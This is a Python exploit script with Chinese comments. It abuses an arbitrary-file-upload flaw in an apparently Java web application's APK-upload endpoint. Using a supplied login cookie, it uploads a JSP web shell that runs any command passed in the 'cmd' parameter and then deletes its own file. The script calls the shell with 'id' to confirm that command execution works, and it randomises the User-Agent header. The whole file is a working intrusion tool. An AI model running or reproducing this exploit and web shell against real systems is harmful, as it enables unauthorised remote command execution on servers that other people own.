
import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='漏洞存在位置/ajaxinvoke/frameworkModuleJob.processApkUpload.upload可以上传任意文件，但是需要提供参数cookie',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')
parser.add_argument('-c', '--cookie', type=str, help='输入登录后cookie')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/ajaxinvoke/frameworkModuleJob.processApkUpload.upload"  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/apk/188/yccwdb.jsp"
    else:
        url = args.url + "/ajaxinvoke/frameworkModuleJob.processApkUpload.upload"
        url1 = args.url + "/apk/188/yccwdb.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    "Connection": "close",
    "Content-Type": "multipart/form-data; boundary=00contenteboundary00",  # 注意边界值
    "Accept-Encoding": "gzip"
}

malicious_jsp = '''<%
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
  int a = -1;
  byte[] b = new byte[2048];
  out.print("<pre>");
  while ((a = in.read(b)) != -1) {
    out.println(new String(b, 0, a));
  }
  out.print("</pre>");
  new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>'''.encode('utf-8')
files = {
    'fileupload': ('yccwdb.jsp', malicious_jsp, 'application/octet-stream')
}
data = {
    'cmd': 'id '
}




response = requests.post(url=url,
    headers=headers,
    files=files)
response1 = requests.get(url=url1,headers=headers,data=data)

if "uid" in response1.text:
    print("目标url："+ url + '\n' +"访问存放的恶意文件成功\n")
    print(response.text)
else:
    print("目标url："+ url + '\n' +"不存在漏洞")